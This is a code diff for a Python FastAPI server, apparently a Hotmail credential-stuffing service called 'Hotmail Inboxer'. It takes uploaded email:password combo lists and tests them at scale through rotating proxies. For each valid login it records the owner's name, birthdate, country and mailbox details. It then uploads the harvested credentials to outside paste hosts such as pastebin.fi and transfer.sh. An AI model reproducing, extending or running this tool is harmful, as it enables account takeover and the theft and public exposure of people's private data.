@@ -10,40 +10,35 @@ import threading
 import os
 import json
 import requests
-import uuid
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# Belső modulok importálása
 from database import *
-from auth import create_access_token, decode_token, get_current_user, hash_password, verify_password
+from auth import *
 from checker import checker_worker_single
 from proxy_manager import proxy_manager
 
-# Globális változók a szálkezeléshez
 user_connections = {}
 ws_lock = threading.Lock()
 stop_flags = {}
 stop_lock = threading.Lock()
 
-# Konfiguráció
-MAX_WORKERS = 60  # Sebesség optimalizáció miatt megemelt érték
+MAX_WORKERS = 40
 ADMIN_EMAIL = "xat.king6969@gmail.com"
 
 
 def upload_to_external_api(content: str, filename: str) -> str:
-    """Eredmények feltöltése külső tárhelyre, ha a belső letöltés nem érhető el."""
     if not content or len(content.strip()) == 0:
         return None
     try:
-        res = requests.post("https://pastebin.fi/documents", data=content.encode('utf-8'), timeout=10)
+        res = requests.post("https://pastebin.fi/documents", data=content.encode('utf-8'), timeout=5)
         if res.status_code == 200:
             key = res.json().get("key")
             return f"https://pastebin.fi/raw/{key}"
     except:
         pass
     try:
-        res = requests.put(f"https://transfer.sh/{filename}", data=content.encode('utf-8'), timeout=15)
+        res = requests.put(f"https://transfer.sh/{filename}", data=content.encode('utf-8'), timeout=8)
         if res.status_code == 200:
             return res.text.strip()
     except:
@@ -53,55 +48,53 @@ def upload_to_external_api(content: str, filename: str) -> str:
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    """A szerver indulásakor és leállásakor futó háttérfeladatok."""
-    print("\n🚀 Hotmail Inboxer VIP - Szerver indítása...")
+    print("\n🔧 Startup...")
 
-    # RENDER FIX: Proxy setup elindítása a háttérben, hogy ne blokkolja a port nyitását
-    async def initial_proxy_setup():
-        print("🔄 Proxyk letöltése és tesztelése a háttérben...")
-        try:
-            await asyncio.to_thread(proxy_manager.fetch_proxies)
-            working_count = await asyncio.to_thread(
-                proxy_manager.test_and_filter,
-                3000, 500, 8
-            )
-            print(f"✅ Proxy setup kész! Működő: {working_count}")
-        except Exception as e:
-            print(f"⚠️ Proxy hiba indításkor: {e}")
+    await asyncio.to_thread(proxy_manager.fetch_proxies)
 
-    asyncio.create_task(initial_proxy_setup())
+    working_count = await asyncio.to_thread(
+        proxy_manager.test_and_filter,
+        3000,
+        500,
+        8
+    )
 
-    # Proxy frissítő ciklus (45 percenként)
+    if working_count == 0:
+        print("⚠️  Nem találtunk működő proxyt!")
+    else:
+        stats = proxy_manager.get_stats()
+        print(f"🟢 {working_count} proxy kész!")
+        print(f"   HTTP: {stats['http']} | SOCKS5: {stats['socks5']} | SOCKS4: {stats['socks4']}")
+
     async def proxy_refresh_loop():
         while True:
             await asyncio.sleep(2700)
+            print("\n🔄 Proxyk frissítése...")
             await asyncio.to_thread(proxy_manager.fetch_and_test)
 
     refresh_task = asyncio.create_task(proxy_refresh_loop())
 
-    # Beragadt futások lezárása indításkor
-    try:
-        from pymongo import MongoClient
-        sync_client = MongoClient(os.getenv("MONGODB_URL"))
-        db = sync_client.hotmail_checker
-        db.runs.update_many(
-            {"status": "running"},
+    from pymongo import MongoClient
+    sync_client = MongoClient(os.getenv("MONGODB_URL"))
+    db = sync_client.hotmail_checker
+    running_runs = db.runs.find({"status": "running"})
+    for run in running_runs:
+        db.runs.update_one(
+            {"_id": run["_id"]},
             {"$set": {"status": "finished", "finished_at": datetime.utcnow()}}
         )
-        sync_client.close()
-    except:
-        pass
+    sync_client.close()
 
     yield
 
-    print("\n🛑 Leállás...")
+    print("\n🛑 Shutdown...")
     refresh_task.cancel()
     with stop_lock:
         for user_id in list(stop_flags.keys()):
             stop_flags[user_id].set()
 
 
-app = FastAPI(title="Hotmail Inboxer VIP", lifespan=lifespan)
+app = FastAPI(title="Hotmail Inboxer", lifespan=lifespan)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -114,7 +107,6 @@ app.mount("/static", StaticFiles(directory="static"), name="static")
 
 
 def broadcast_to_user(user_id: str, message: str):
-    """Valós idejű WebSocket üzenet küldése a felhasználónak."""
     with ws_lock:
         if user_id not in user_connections:
             return
@@ -126,9 +118,9 @@ def broadcast_to_user(user_id: str, message: str):
                 dead.append(ws_info)
         for d in dead:
             user_connections[user_id].remove(d)
+        if not user_connections[user_id]:
+            del user_connections[user_id]
 
-
-# --- OLDALAK ---
 
 @app.get("/", response_class=HTMLResponse)
 async def login_page(request: Request):
@@ -150,22 +142,13 @@ async def admin_page(request: Request):
     return templates.TemplateResponse("admin.html", {"request": request})
 
 
-# --- API VÉGPONTOK ---
-
 @app.post("/api/register")
-async def register(email: str = Form(...), password: str = Form(...), invite_code: str = Form(...)):
+async def register(email: str = Form(...), password: str = Form(...)):
     if len(password) < 6:
-        raise HTTPException(status_code=400, detail="Minimum 6 karakter jelszó!")
-    
-    invite = await get_invite_code(invite_code)
-    if not invite or invite.get("is_used"):
-        raise HTTPException(status_code=400, detail="Érvénytelen vagy felhasznált kód!")
-
+        raise HTTPException(status_code=400, detail="Minimum 6 karakter jelszó")
     if await get_user_by_email(email):
-        raise HTTPException(status_code=400, detail="Ezzel az email címmel már regisztráltak!")
-    
-    await create_user(email, hash_password(password), invite_code)
-    await mark_invite_used(invite_code, email)
+        raise HTTPException(status_code=400, detail="Foglalt email")
+    await create_user(email, hash_password(password))
     return {"token": create_access_token({"sub": email}), "email": email}
 
 
@@ -173,32 +156,33 @@ async def register(email: str = Form(...), password: str = Form(...), invite_cod
 async def login(email: str = Form(...), password: str = Form(...)):
     user = await get_user_by_email(email)
     if not user or not verify_password(password, user["password"]):
-        raise HTTPException(status_code=401, detail="Hibás email vagy jelszó!")
+        raise HTTPException(status_code=401, detail="Hibás adatok")
     return {"token": create_access_token({"sub": email}), "email": email}
 
 
-@app.get("/api/me")
-async def get_me(current_user=Depends(get_current_user)):
-    """Felhasználó zárolási állapotának lekérése."""
+@app.get("/api/proxy_status")
+async def proxy_status(current_user=Depends(get_current_user)):
+    stats = proxy_manager.get_stats()
     return {
-        "email": current_user["email"],
-        "needs_new_invite": current_user.get("needs_new_invite", False)
+        "proxy_count": stats["total"],
+        "http": stats["http"],
+        "socks4": stats["socks4"],
+        "socks5": stats["socks5"],
+        "tested": proxy_manager.is_tested(),
     }
 
 
-@app.post("/api/reactivate")
-async def reactivate_account(invite_code: str = Form(...), current_user=Depends(get_current_user)):
-    """Zárolt fiók újraaktiválása."""
-    invite = await get_invite_code(invite_code)
-    if not invite or invite.get("is_used"):
-        raise HTTPException(status_code=400, detail="Ez a kód érvénytelen vagy már foglalt!")
-    
-    await reactivate_user(current_user["email"], invite_code)
-    await mark_invite_used(invite_code, current_user["email"])
-    return {"status": "success"}
+@app.post("/api/refresh_proxies")
+async def refresh_proxies(current_user=Depends(get_current_user)):
+    count = await asyncio.to_thread(proxy_manager.fetch_and_test)
+    stats = proxy_manager.get_stats()
+    return {
+        "proxy_count": count,
+        "http": stats["http"],
+        "socks4": stats["socks4"],
+        "socks5": stats["socks5"],
+    }
 
-
-# --- ADMIN API-K ---
 
 @app.get("/api/admin/invites")
 async def get_invites(current_user=Depends(get_current_user)):
@@ -232,7 +216,6 @@ async def delete_invite(code: str, current_user=Depends(get_current_user)):
     return {"status": "deleted"}
 
 
-# --- CHECKER MŰVELETEK ---
 
 @app.post("/api/start")
 async def start_checker(
@@ -241,21 +224,19 @@ async def start_checker(
     threads: int = Form(MAX_WORKERS),
     current_user=Depends(get_current_user),
 ):
-    if current_user.get("needs_new_invite"):
-        raise HTTPException(status_code=403, detail="A fiókod zárolva van!")
-
     if await get_active_run(str(current_user["_id"])):
-        raise HTTPException(status_code=400, detail="Már fut egy keresés!")
+        raise HTTPException(status_code=400, detail="Már fut egy checker!")
 
     threads = max(1, min(threads, 100))
+
     content = await file.read()
     lines = [
         l.strip()
         for l in content.decode("utf-8", errors="ignore").splitlines()
-        if ':' in l and '@' in l
+        if ':' in l and '@' in l and l.count(':') == 1
     ]
     if not lines:
-        raise HTTPException(status_code=400, detail="Nincs érvényes adat a fájlban!")
+        raise HTTPException(status_code=400, detail="Nincs érvényes email:jelszó sor")
 
     user_id = str(current_user["_id"])
     run_id = await create_run(user_id, keyword, len(lines))
@@ -269,7 +250,12 @@ async def start_checker(
         daemon=True,
     ).start()
 
-    return {"run_id": run_id, "total": len(lines)}
+    return {
+        "run_id": run_id,
+        "total": len(lines),
+        "threads": threads,
+        "proxies": proxy_manager.get_stats(),
+    }
 
 
 @app.post("/api/stop")
@@ -279,20 +265,37 @@ async def stop_checker(current_user=Depends(get_current_user)):
         if user_id in stop_flags:
             stop_flags[user_id].set()
             return {"status": "stopping"}
-    raise HTTPException(status_code=404, detail="Nincs mit leállítani.")
+    raise HTTPException(status_code=404, detail="Nincs futó checker")
 
 
-async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, num_threads: int):
-    """Optimalizált checker végrehajtó szekvencia batching logikával."""
+async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, num_threads: int = MAX_WORKERS):
     checked = hits = custom = bad = retries = 0
     total = len(lines)
-    main_loop = asyncio.get_event_loop()
+    stopped = False
     lock = threading.Lock()
 
+    stats = proxy_manager.get_stats()
+    pc = stats["total"]
+
+    if pc > 0:
+        mode = f"🔒 {pc} proxy (H:{stats['http']} S5:{stats['socks5']} S4:{stats['socks4']})"
+    else:
+        mode = "⚠️ Nincs proxy!"
+
+    broadcast_to_user(user_id, json.dumps({
+        "type": "log", "level": "info",
+        "text": f"[START] {total} combo | {keyword} | {num_threads} szál"
+    }))
+    broadcast_to_user(user_id, json.dumps({
+        "type": "log", "level": "info",
+        "text": f"[MODE] {mode}"
+    }))
+
+    main_loop = asyncio.get_event_loop()
+
     def check_single(line):
-        nonlocal checked, hits, custom, bad, retries
-        
-        # AZONNALI STOP ELLENŐRZÉS a szál belépésekor
+        nonlocal checked, hits, custom, bad, retries, stopped
+
         with stop_lock:
             if user_id in stop_flags and stop_flags[user_id].is_set():
                 return
@@ -305,70 +308,143 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
         result = checker_worker_single(email, password, keyword)
 
         with lock:
+            with stop_lock:
+                if user_id in stop_flags and stop_flags[user_id].is_set():
+                    stopped = True
+                    return
+
             checked += 1
+
             if result["status"] == "hit":
                 hits += 1
                 d = result["data"]
-                lt = f"[HIT] {d['email']}:{d['password']} | Ország: {d['country']} | Levelek: {d['mails']}"
-                asyncio.run_coroutine_threadsafe(add_result_to_run(run_id, "hit", lt), main_loop)
-                asyncio.run_coroutine_threadsafe(add_result_details_to_run(run_id, "hit", d), main_loop)
-                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "hit", "text": lt}))
+                lt = (
+                    f"{d['email']}:{d['password']} | Country={d['country']} | "
+                    f"Name={d['name']} | Birthdate={d['birthdate']} | "
+                    f"Mails={d['mails']} | LastMail={d['date']}"
+                )
+
+                try:
+                    asyncio.run_coroutine_threadsafe(
+                        add_result_to_run(run_id, "hit", lt),
+                        main_loop
+                    ).result(timeout=5)
+                    asyncio.run_coroutine_threadsafe(
+                        add_result_details_to_run(run_id, "hit", d),
+                        main_loop
+                    ).result(timeout=5)
+                except:
+                    pass
+
+                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "hit", "text": f"[HIT] {lt}"}))
                 broadcast_to_user(user_id, json.dumps({"type": "live_hit", "data": d}))
 
             elif result["status"] == "custom":
                 custom += 1
-                lt = f"[LOGGED] {email}:{password}"
-                asyncio.run_coroutine_threadsafe(add_result_to_run(run_id, "custom", lt), main_loop)
-                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "custom", "text": lt}))
+                d = result["data"]
+                lt = (
+                    f"{d['email']}:{d['password']} | Country={d['country']} | "
+                    f"Name={d['name']} | Birthdate={d['birthdate']}"
+                )
+
+                try:
+                    asyncio.run_coroutine_threadsafe(
+                        add_result_to_run(run_id, "custom", lt),
+                        main_loop
+                    ).result(timeout=5)
+                    asyncio.run_coroutine_threadsafe(
+                        add_result_details_to_run(run_id, "custom", d),
+                        main_loop
+                    ).result(timeout=5)
+                except:
+                    pass
+
+                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "custom", "text": f"[CUSTOM] {lt}"}))
+                broadcast_to_user(user_id, json.dumps({"type": "live_custom", "data": d}))
 
             elif result["status"] == "bad":
                 bad += 1
-                # LOG JAVÍTÁS: Mindig írja ki a rosszakat a logba
-                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "bad", "text": f"[BAD] {email}"}))
+                broadcast_to_user(user_id, json.dumps({
+                    "type": "log", "level": "bad",
+                    "text": f"[BAD] {email}"
+                }))
 
             else:
                 retries += 1
 
             if checked % 5 == 0 or checked == total:
-                asyncio.run_coroutine_threadsafe(
-                    update_run_stats(run_id, {"checked": checked, "hits": hits, "custom": custom, "bad": bad, "retries": retries}),
-                    main_loop
-                )
+                try:
+                    asyncio.run_coroutine_threadsafe(
+                        update_run_stats(run_id, {
+                            "checked": checked, "hits": hits, "custom": custom,
+                            "bad": bad, "retries": retries,
+                        }),
+                        main_loop
+                    )
+                except:
+                    pass
 
             broadcast_to_user(user_id, json.dumps({
-                "type": "stats", "run_id": run_id, "checked": checked, "hits": hits,
-                "custom": custom, "bad": bad, "retries": retries, "total": total,
+                "type": "stats", "run_id": run_id,
+                "checked": checked, "hits": hits, "custom": custom,
+                "bad": bad, "retries": retries, "total": total,
             }))
 
-    # BATCH FELDOLGOZÁS a gyors stop érdekében
-    with ThreadPoolExecutor(max_workers=num_threads) as executor:
-        batch_size = num_threads * 2
-        for i in range(0, len(lines), batch_size):
-            with stop_lock:
-                if user_id in stop_flags and stop_flags[user_id].is_set():
-                    break
-            
-            batch = lines[i : i + batch_size]
-            futures = [executor.submit(check_single, line) for line in batch]
-            for f in as_completed(futures):
-                try: f.result()
-                except: pass
+    def run_parallel():
+        with ThreadPoolExecutor(max_workers=num_threads) as executor:
+            futures = []
+            for line in lines:
+                with stop_lock:
+                    if user_id in stop_flags and stop_flags[user_id].is_set():
+                        break
+                futures.append(executor.submit(check_single, line))
 
-    # Futtatás lezárása
-    final_run = await get_run(run_id)
-    hits_url = custom_url = None
-    if final_run and (hits > 0 or custom > 0):
-        broadcast_to_user(user_id, json.dumps({"type": "log", "level": "info", "text": "⏳ Eredmények mentése..."}))
-        hits_url = await asyncio.to_thread(upload_to_external_api, "\n".join(final_run.get("hit_lines", [])), f"Hits_{run_id}.txt")
-        custom_url = await asyncio.to_thread(upload_to_external_api, "\n".join(final_run.get("custom_lines", [])), f"Custom_{run_id}.txt")
-    
-    await finish_and_clean_run(run_id, hits_url, custom_url)
-    
-    # Értesítés a befejezésről
-    status_type = "stopped" if (user_id in stop_flags and stop_flags[user_id].is_set()) else "finished"
-    broadcast_to_user(user_id, json.dumps({"type": status_type, "run_id": run_id}))
-    broadcast_to_user(user_id, json.dumps({"type": "log", "level": "finish", "text": f"🏁 KÉSZ! Találat: {hits}"}))
-    
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                except:
+                    pass
+
+    await asyncio.to_thread(run_parallel)
+
+    await update_run_stats(run_id, {
+        "checked": checked, "hits": hits, "custom": custom,
+        "bad": bad, "retries": retries,
+    })
+    await update_run_status_only(run_id, "finished")
+
+    if hits > 0 or custom > 0:
+        broadcast_to_user(user_id, json.dumps({
+            "type": "log", "level": "info",
+            "text": "⏳ Eredmények feltöltése..."
+        }))
+        final_run = await get_run(run_id)
+        if final_run:
+            hit_lines = final_run.get("hit_lines", [])
+            custom_lines = final_run.get("custom_lines", [])
+            hits_url = (
+                await asyncio.to_thread(upload_to_external_api, "\n".join(hit_lines), f"Hotmail_Hits_{run_id}.txt")
+                if hit_lines else None
+            )
+            custom_url = (
+                await asyncio.to_thread(upload_to_external_api, "\n".join(custom_lines), f"Hotmail_Custom_{run_id}.txt")
+                if custom_lines else None
+            )
+            await finish_and_clean_run(run_id, hits_url, custom_url)
+    else:
+        await finish_and_clean_run(run_id, None, None)
+
+    with stop_lock:
+        if user_id in stop_flags and stop_flags[user_id].is_set():
+            stopped = True
+
+    st_text = "LEÁLLÍTVA" if stopped else "KÉSZ"
+    broadcast_to_user(user_id, json.dumps({
+        "type": "log", "level": "finish",
+        "text": f"[{st_text}] Hits: {hits} | Custom: {custom} | Bad: {bad}"
+    }))
+    broadcast_to_user(user_id, json.dumps({"type": "finished", "run_id": run_id}))
+
     with stop_lock:
         if user_id in stop_flags:
             del stop_flags[user_id]
@@ -394,7 +470,7 @@ async def get_download_url(run_id: str, type: str, current_user=Depends(get_curr
         return {"url": run["hits_url"]}
     if type == "custom" and run.get("custom_url"):
         return {"url": run["custom_url"]}
-    return {"url": f"/api/download_direct/{run_id}/{type}"}
+    return {"url": f"/api/download_direct/{run_id}/{type}?token={current_user['email']}"}
 
 
 @app.get("/api/download_direct/{run_id}/{type}")
@@ -404,8 +480,8 @@ async def download_direct(run_id: str, type: str):
         raise HTTPException(status_code=404)
     lines = run.get("hit_lines" if type == "hits" else "custom_lines", [])
     return PlainTextResponse(
-        content="\n".join(lines) if lines else "Nincs adat",
-        headers={"Content-Disposition": f'attachment; filename="Hotmail-{type}.txt"'}
+        content="\n".join(lines) if lines else "Nincs eredmény",
+        headers={"Content-Disposition": f'attachment; filename="Hotmail-{type}.txt"'},
     )
 
 
@@ -428,22 +504,48 @@ async def websocket_endpoint(websocket: WebSocket, token: str = ""):
         user_connections[user_id].append(ws_info)
 
     try:
-        active_run = await get_active_run(user_id)
-        if active_run:
-            active_run["_id"] = str(active_run["_id"])
-            await websocket.send_text(json.dumps({"type": "active_run", "run": active_run}))
+        stats = proxy_manager.get_stats()
+        await websocket.send_text(json.dumps({
+            "type": "proxy_info",
+            "count": stats["total"],
+            "http": stats["http"],
+            "socks4": stats["socks4"],
+            "socks5": stats["socks5"],
+            "tested": proxy_manager.is_tested(),
+        }))
+    except:
+        pass
 
+    active_run = await get_active_run(user_id)
+    if active_run:
+        active_run["_id"] = str(active_run["_id"])
+        active_run["started_at"] = active_run["started_at"].isoformat()
+        try:
+            await websocket.send_text(json.dumps({"type": "active_run", "run": active_run}))
+            for hit in active_run.get("hit_details", []):
+                await websocket.send_text(json.dumps({"type": "live_hit", "data": hit}))
+            for c in active_run.get("custom_details", []):
+                await websocket.send_text(json.dumps({"type": "live_custom", "data": c}))
+        except:
+            pass
+
+    try:
         while True:
             data = await websocket.receive_text()
             if data == "ping":
                 await websocket.send_text("pong")
-    except:
+    except (WebSocketDisconnect, RuntimeError, Exception):
         with ws_lock:
-            if user_id in user_connections:
+            if user_id in user_connections and ws_info in user_connections[user_id]:
                 user_connections[user_id].remove(ws_info)
 
 
 if __name__ == "__main__":
     import uvicorn
     port = int(os.getenv("PORT", 8000))
+    print("\n" + "=" * 60)
+    print("  🚀 Hotmail Inboxer - Parallel + Strict Validation")
+    print(f"  📡 http://0.0.0.0:{port}")
+    print(f"  🧵 Max {MAX_WORKERS} párhuzamos szál")
+    print("=" * 60 + "\n")
     uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False, log_level="info")
